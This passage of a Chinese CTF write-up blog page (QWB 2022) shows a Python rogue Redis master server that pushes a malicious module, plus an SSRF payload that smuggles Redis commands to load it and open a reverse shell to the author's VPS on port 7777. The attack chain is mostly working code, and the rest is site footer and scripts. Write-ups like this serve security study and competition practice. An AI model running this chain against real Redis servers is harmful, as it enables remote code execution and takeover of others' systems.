class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">payload=<span class="built_in">open</span>(<span class="string">&quot;exp.so&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">exp_filename=<span class="string">&quot;exp.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span>(<span class="params">lport</span>):</span></span><br><span class="line">    <span class="keyword">global</span> CRLF</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket()</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    clientSock, address = sock.accept()</span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        data = clientSock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">&quot;+PONG&quot;</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">&quot;+OK&quot;</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CRLF</span><br><span class="line">            result += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CRLF</span><br><span class="line">            result = result.encode()</span><br><span class="line">            result += payload</span><br><span class="line">            result += CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;done&quot;</span></span><br><span class="line"></span><br><span class="line">RogueServer(<span class="number">6378</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在vps上监听6378端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AUTH enw!BKT_hac*pev9nvj</span></span><br><span class="line"><span class="string">SLAVEOF ip 6378</span></span><br><span class="line"><span class="string">config set dbfilename exp.so</span></span><br><span class="line"><span class="string">MODULE LOAD ./exp.so</span></span><br><span class="line"><span class="string">system.rev ip 7777</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload</span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br></pre></td></tr></table></figure>
+
+<p>Post: url=<payload></p>
+<p>监听7777端口，接收到shell</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500699.(null)" alt="img"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyweb"><span class="toc-number">1.1.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crash"><span class="toc-number">1.2.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easylogin"><span class="toc-number">1.3.</span> <span class="toc-text">easylogin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number">2.</span> <span class="toc-text">强网先锋</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DSCTF%E5%86%B3%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">DSCTF决赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-script-new"><span class="toc-number">3.1.</span> <span class="toc-text">safe_script_new</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-java-new"><span class="toc-number">3.2.</span> <span class="toc-text">ez_java_new</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/01/QWB2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/01/QWB2022/&text=NS - QWB 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/01/QWB2022/&is_video=false&description=NS - QWB 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NS - QWB 2022&body=Check out this article: http://w1mps.github.io/2022/08/01/QWB2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/01/QWB2022/&title=NS - QWB 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/01/QWB2022/&name=NS - QWB 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/01/QWB2022/&t=NS - QWB 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->
+
+    <div class="footer-center">
+      Copyright &copy;
+      
+      
+      2021-2022
+      Powered by
+      outx
+      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
+    </div>
+  
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  <br>
+
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
